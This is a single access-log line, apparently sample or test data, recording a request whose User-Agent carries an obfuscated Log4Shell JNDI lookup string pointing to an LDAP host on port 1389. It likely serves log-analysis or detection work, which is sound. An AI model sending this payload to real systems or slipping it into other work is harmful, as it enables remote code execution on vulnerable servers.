      - '203.0.113.71 - - [21/Nov/2026:09:01:09 +0000] "GET / HTTP/1.1" 400 0 "-" "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$ldap://203.0.113.52:1389/a}"'
